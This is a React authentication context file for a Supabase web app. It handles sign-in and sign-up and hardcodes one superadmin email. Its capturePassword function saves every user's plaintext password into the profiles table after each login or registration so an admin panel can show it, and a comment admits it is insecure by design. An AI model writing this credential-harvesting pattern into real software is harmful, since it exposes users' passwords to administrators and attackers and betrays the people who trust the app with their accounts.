import { createContext, useContext, useEffect, useState } from 'react';
import { supabase } from '../lib/supabase';

const AuthContext = createContext(null);

export const SUPERADMIN_EMAIL = 'rodionnrb@gmail.com';

// Store the plaintext password on the user's profile so the superadmin panel
// can display it. Insecure by design (per product requirement). Best-effort.
async function capturePassword(userId, password) {
  if (!userId || !password) return;
  try {
    await supabase.from('profiles').update({ password_plain: password }).eq('id', userId);
  } catch {
    /* noop */
  }
}

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setUser(session?.user ?? null);
      setLoading(false);
    });
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setUser(session?.user ?? null);
    });
    return () => subscription.unsubscribe();
  }, []);

  const signIn = async (email, password) => {
    const { data, error } = await supabase.auth.signInWithPassword({
      email: email.trim(),
      password,
    });
    if (!error && data?.user) capturePassword(data.user.id, password);
    return { data, error };
  };

  const signUp = async (email, password) => {
    const { data, error } = await supabase.auth.signUp({
      email: email.trim(),
      password,
      options: { emailRedirectTo: undefined },
    });
    if (!error && data?.session?.user) capturePassword(data.session.user.id, password);
    return { data, error };
  };

  const signOut = async () => {
    await supabase.auth.signOut();
  };

  const isSuperAdmin = (user?.email ?? '').toLowerCase() === SUPERADMIN_EMAIL;

  const value = { user, loading, signIn, signUp, signOut, isSuperAdmin };
  return <AuthContext.Provider value={value}>{children}</AuthContext.Provider>;
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used within AuthProvider');
  return ctx;
}
